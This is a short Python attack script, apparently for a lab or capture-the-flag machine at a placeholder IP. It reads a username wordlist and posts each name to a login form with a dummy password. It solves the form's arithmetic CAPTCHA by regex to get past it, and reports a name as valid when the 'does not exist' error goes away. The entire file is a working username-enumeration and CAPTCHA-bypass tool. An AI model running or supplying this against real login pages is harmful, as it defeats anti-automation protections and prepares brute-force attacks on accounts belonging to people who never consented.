import requests
import re

# Function to extract and solve the CAPTCHA
def extract_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)
    
    if match:
        num1, operator, num2 = int(match.group(1)), match.group(2), int(match.group(3))
        
        if operator == '+':
            return num1 + num2
        elif operator == '-':
            return num1 - num2
        elif operator == '*':
            return num1 * num2

    return None  # Return None if no CAPTCHA is found

# Target URL
url = "http://10.10.10.10/login" #Enter the logins IP

# Read usernames from file
with open('usernames.txt', 'r') as file: # Enter the usernames file 
    usernames = [line.strip() for line in file]

# Try each username
for username in usernames:
    session = requests.Session()

    # First request without CAPTCHA (to check response)
    response = session.post(url, data={'username': username, 'password': 'password'})
    
    # Extract CAPTCHA if present
    captcha_answer = extract_captcha(response.text)

    # If CAPTCHA exists, retry with the solved answer
    if captcha_answer is not None:
        data = {'username': username, 'password': 'password', 'captcha': captcha_answer}
        response = session.post(url, data=data)

    # Extract error message
    error_message_match = re.search(r'Error:\s*(.+)', response.text)
    error_message = error_message_match.group(1) if error_message_match else 'No error message found'

    print(f"{username} - Error message: {error_message}")

    # Stop if we find a valid username
    if "does not exist" not in response.text:
        print(f"[+] Valid username found: {username}")
        break
